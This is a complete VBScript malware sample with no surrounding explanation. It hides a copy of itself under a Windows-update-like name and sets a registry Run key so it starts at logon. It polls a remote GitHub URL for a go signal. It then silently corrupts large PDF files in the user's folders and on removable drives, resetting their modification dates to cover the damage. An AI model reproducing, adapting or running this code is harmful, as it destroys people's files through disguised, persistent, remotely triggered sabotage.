On Error Resume Next
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
Set objXML = CreateObject("MSXML2.XMLHTTP")

Dim statusURL
statusURL = "https://raw.githubusercontent.com/pwnmyimhide/uwu/refs/heads/main/boom.txt"

strAppData = objShell.ExpandEnvironmentStrings("%AppData%") & "\WinUpdateSvc"
If Not objFSO.FolderExists(strAppData) Then objFSO.CreateFolder(strAppData)
strTargetFile = strAppData & "\host_process.vbs"

If Not objFSO.FileExists(strTargetFile) Then
    objFSO.CopyFile WScript.ScriptFullName, strTargetFile
    objFSO.GetFile(strTargetFile).Attributes = 2 + 4
End If

' چاککردنی ناونیشانی ڕێجستری بۆ کارکردنی ئۆتۆماتیکی
strRegPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WindowsHostUpdate"
objShell.RegWrite strRegPath, "wscript.exe """ & strTargetFile & """", "REG_SZ"

Dim TargetPaths(4)
TargetPaths(0) = objShell.SpecialFolders("Desktop")
TargetPaths(1) = objShell.SpecialFolders("MyDocuments")
TargetPaths(2) = objShell.ExpandEnvironmentStrings("%UserProfile%") & "\Downloads"
TargetPaths(3) = objShell.ExpandEnvironmentStrings("%UserProfile%") & "\Pictures"
TargetPaths(4) = objShell.ExpandEnvironmentStrings("%UserProfile%") & "\Videos"

Do
    If ShouldIExecute() = "1" Then
        For Each path In TargetPaths
            If objFSO.FolderExists(path) Then DeepScan path
        Next
        
        Set drives = objFSO.Drives
        For Each d In drives
            If d.IsReady Then
                If d.DriveType = 1 Then 
                    DeepScan d.RootFolder.Path
                End If
            End If
        Next
    End If
    WScript.Sleep 600000
Loop

Function ShouldIExecute()
    On Error Resume Next
    objXML.Open "GET", statusURL & "?t=" & Timer, False
    objXML.Send
    If objXML.Status = 200 Then
        ShouldIExecute = Trim(objXML.ResponseText)
    Else
        ShouldIExecute = "0"
    End If
End Function

Sub DeepScan(folderPath)
    On Error Resume Next
    Set folder = objFSO.GetFolder(folderPath)
    For Each file In folder.Files
        If LCase(objFSO.GetExtensionName(file.Name)) = "pdf" And file.Size > 1048576 Then
            oldDate = file.DateLastModified
            Set fRead = objFSO.OpenTextFile(file.Path, 1)
            header = fRead.Read(5)
            fRead.Close
            If header = "%PDF-" Then
                allContent = objFSO.OpenTextFile(file.Path, 1).ReadAll
                corruptedContent = "%%ERROR_DATA_0x" & Hex(Timer) & Mid(allContent, 30)
                Set fWrite = objFSO.OpenTextFile(file.Path, 2, False)
                If Err.Number = 0 Then
                    fWrite.Write corruptedContent
                    fWrite.Close
                    Set objShellApp = CreateObject("Shell.Application")
                    Set objFolder = objShellApp.Namespace(objFSO.GetParentFolderName(file.Path))
                    objFolder.ParseName(file.Name).ModifyDate = oldDate
                End If
                Err.Clear
                WScript.Sleep 200 
            End If
        End If
    Next
    For Each subF In folder.SubFolders
        DeepScan subF.Path
    Next
End Sub
